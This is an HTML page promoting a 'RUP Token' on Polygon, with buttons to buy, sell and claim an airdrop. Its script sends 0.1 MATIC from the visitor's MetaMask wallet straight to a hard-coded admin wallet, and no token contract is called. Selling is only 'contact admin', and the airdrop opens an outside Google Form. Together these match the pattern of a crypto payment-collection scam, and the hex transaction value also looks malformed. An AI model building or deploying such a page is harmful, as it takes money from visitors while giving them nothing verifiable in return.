<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RUP Token | Official Website</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('bg.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      text-align: center;
    }
    header {
      padding: 20px;
      background: rgba(0, 0, 0, 0.6);
    }
    header img {
      width: 100px;
      height: auto;
    }
    h1 {
      font-size: 2.5em;
      margin: 10px 0;
    }
    .btn {
      display: inline-block;
      margin: 10px;
      padding: 15px 30px;
      font-size: 1.2em;
      color: white;
      background: goldenrod;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 2px 2px 10px #000;
    }
    .section {
      background: rgba(0, 0, 0, 0.5);
      margin: 20px;
      padding: 20px;
      border-radius: 15px;
    }
    .terms {
      color: #fffcb7;
      text-align: left;
      margin: 30px auto;
      max-width: 700px;
      font-size: 0.9em;
    }
  </style>
</head>
<body>
  <header>
    <img src="rup-logo.png" alt="RUP Token Logo" />
    <h1>Welcome to RUP Token</h1>
    <p>The future of community-powered finance!</p>
  </header>

  <div class="section">
    <button class="btn" onclick="buyToken()">Buy RUP Token</button>
    <button class="btn" onclick="sellToken()">Sell RUP Token</button>
    <button class="btn" onclick="claimAirdrop()">Claim Free Airdrop</button>
  </div>

  <div class="section terms">
    <h3>Terms & Conditions:</h3>
    <ul>
      <li>Airdrop is limited to one claim per wallet.</li>
      <li>Make sure you are connected to Polygon Network.</li>
      <li>Buying RUP sends MATIC to admin wallet.</li>
      <li>Use MetaMask to interact with the website.</li>
    </ul>
  </div>

  <script>
    const adminWallet = "0x436bC1973B443c8a3c3E7C6D06271e68B49B32A4";

    async function buyToken() {
      if (window.ethereum) {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const amount = '0.1'; // MATIC
        const transactionParameters = {
          to: adminWallet,
          from: accounts[0],
          value: (parseFloat(amount) * 1e18).toString(16),
        };
        try {
          await ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
          });
          alert('Buy request sent successfully!');
        } catch (error) {
          alert('Buy failed! ' + error.message);
        }
      } else {
        alert('Please install MetaMask to continue');
      }
    }

    function sellToken() {
      alert('Please visit QuickSwap or contact admin to sell RUP token.');
    }

    function claimAirdrop() {
      window.open("https://docs.google.com/forms/d/1c7wCT1bU1dqFXz-JdyZDlF8eCUgvNqr4KA3M3kH-42U/viewform", '_blank');
    }
  </script>
</body>
</html>
